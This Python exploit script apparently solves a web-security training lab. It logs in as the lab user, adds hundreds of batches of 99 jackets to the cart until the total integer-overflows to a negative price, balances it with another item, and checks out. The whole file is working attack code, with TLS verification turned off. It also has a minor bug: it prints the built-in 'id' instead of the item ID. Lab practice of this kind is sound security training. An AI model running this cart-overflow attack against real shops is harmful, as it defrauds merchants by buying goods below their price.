import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_id_of_item(session, url, price):
    r = session.get(url, verify=False)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    wanted = price.replace("$", "").strip()

    for div in soup.find_all("div"):
        text = div.get_text(" ", strip=True).replace("$", "")
        if wanted in text:
            a = div.find("a", href=True)
            if a and "productId=" in a["href"]:
                return parse_qs(urlparse(a["href"]).query).get("productId", [None])[0]
    return None


def buy_item(session: requests.Session, url: str):
    url = url.rstrip("/")

    # 1) login 
    print("(+) Trying to logging as wienner...")
    login(session, f"{url}/login", username="wiener", password="peter")
    print("(+) Successfully logged-in")

    # 2) Add the item to the cart
    print("(+) Trying to buy \"Lightweight l33t leather jacket\"...")
    # POST /cart -> productId=1&redir=PRODUCT&quantity=99
    for i in range(324):
        response =  session.post(f"{url}/cart", data={"productId": "1", "redir": "PRODUCT", "quantity" : "99"}, verify=False)
        response.raise_for_status()
    print(f"number of \"Lightweight l33t leather jacket\" is {324 * 99}")
    total = 64060.96
    print(f"Total : 	-{total}$")

    price = input("Enter the price of the item: ")
    item_id = get_id_of_item(session, url, price)
    if not item_id:
        raise RuntimeError("Could not find productId for that price.")
    print(f"Id of the item is : {id}")
    needed_pieces = int(total / float(price))
    amount = needed_pieces * float(price) - total
    if amount < 0:
        needed_pieces = needed_pieces + 1
    elif amount > 100:
        needed_pieces = needed_pieces - 1

    x = int(needed_pieces / 99)
    rest = needed_pieces - x * 99 

    for j in range(x):
        response =  session.post(f"{url}/cart", data={"productId": item_id, "redir": "PRODUCT", "quantity" : "99"}, verify=False)
        response.raise_for_status()
    response =  session.post(f"{url}/cart", data={"productId": item_id, "redir": "PRODUCT", "quantity" : str(rest)}, verify=False)
    response.raise_for_status()
    print("(+) Success")

    # 3) Checkout
    csrf_token = get_csrf_token(session, f"{url}/cart")
    response = session.post(f"{url}/cart/checkout", data={"csrf":csrf_token}, verify=False)
    response.raise_for_status()

    # 4) Check solved condition
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1])

main()
# if __name__=="__main__":
#     main()

